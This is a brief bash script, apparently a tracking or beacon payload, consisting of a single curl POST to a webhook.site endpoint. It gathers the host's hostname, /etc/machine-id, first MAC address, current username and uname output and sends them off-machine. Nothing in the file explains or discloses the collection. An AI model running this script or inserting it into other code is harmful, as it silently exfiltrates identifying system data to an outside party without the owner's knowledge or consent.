#!/bin/bash
curl -X POST https://webhook.site/883bbab2-6b20-4c10-bf25-152556a5a049 \
  -d "hostname=$(hostname)" \
  -d "machine_id=$(cat /etc/machine-id)" \
  -d "mac=$(ip link | awk '/ether/ {print $2}' | head -n 1)" \
  -d "user=$(whoami)" \
  -d "os=$(uname -a)"
